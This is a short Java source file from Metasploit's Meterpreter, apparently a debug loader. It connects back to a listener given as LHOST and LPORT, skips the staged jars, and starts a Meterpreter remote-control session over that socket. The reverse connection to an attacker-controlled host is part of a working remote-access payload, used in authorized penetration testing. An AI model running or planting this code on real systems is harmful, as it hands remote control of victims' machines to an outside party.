package com.metasploit.meterpreter;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 * A loader that does not use the provided jars but loads all classes from the current classpath. Useful for debugging with the edit-and-continue feature enabled.
 * 
 * @author mihi
 */
public class DebugLoader {
	/**
	 * Main entry point.
	 */
	public static void main(String[] args) throws Exception {
		if (args.length < 2) {
			System.out.println("Usage: java com.metasploit.meterpreter.DebugLoader <LHOST> <LPORT> [<RedirectError>]");
			return;
		}
		Socket msgsock = new Socket(args[0], Integer.parseInt(args[1]));
		DataInputStream in = new DataInputStream(msgsock.getInputStream());
		OutputStream out = new DataOutputStream(msgsock.getOutputStream());
		int coreLen = in.readInt();
		while (coreLen != 0) {
			in.readFully(new byte[coreLen]);
			coreLen = in.readInt();
		}
		coreLen = in.readInt();
		in.readFully(new byte[coreLen]);
		new com.metasploit.meterpreter.Meterpreter(in, out, false, args.length == 3);
		msgsock.close();
	}
}
